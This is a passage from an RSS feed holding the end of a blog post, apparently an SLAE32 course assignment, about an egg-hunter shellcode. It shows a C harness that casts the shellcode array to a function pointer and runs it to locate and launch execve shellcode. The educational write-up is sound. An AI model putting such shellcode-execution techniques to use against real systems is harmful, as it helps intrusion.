    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Egg-hunter length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// run the egg-hunter shellcode&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I saved the &lt;code&gt;execve&lt;/code&gt; shellcode inside an array named &lt;code&gt;shellcode&lt;/code&gt;, while storing the egg-hunter shellcode inside the array &lt;code&gt;egghunter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Inside the &lt;code&gt;main&lt;/code&gt; function, the programs prints the length of the two shellcodes, and finally executes the egg-hunter shellcode. It does so by getting the pointer of the latter, and turning it into a function.&lt;/p&gt;
&lt;p&gt;Follows a screenshot demostrating the successful execution of the program:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/slae32/egg_hunter_shellcode_proof.png&quot; alt=&quot;Egg-hunter found and executed the execve shellcode&quot; /&gt;
&lt;em&gt;Egg-hunter found and executed the execve shellcode&lt;/em&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 21 Dec 2021 00:00:00 +0100</pubDate>
        <link>/21/12/21/slae32-assignment-3</link>
        <guid isPermaLink="true">/21/12/21/slae32-assignment-3</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>egghunter</category>
        
        <category>shellcode</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        
        <category>blog</category>
        
      </item>
    
  </channel>
</rss>
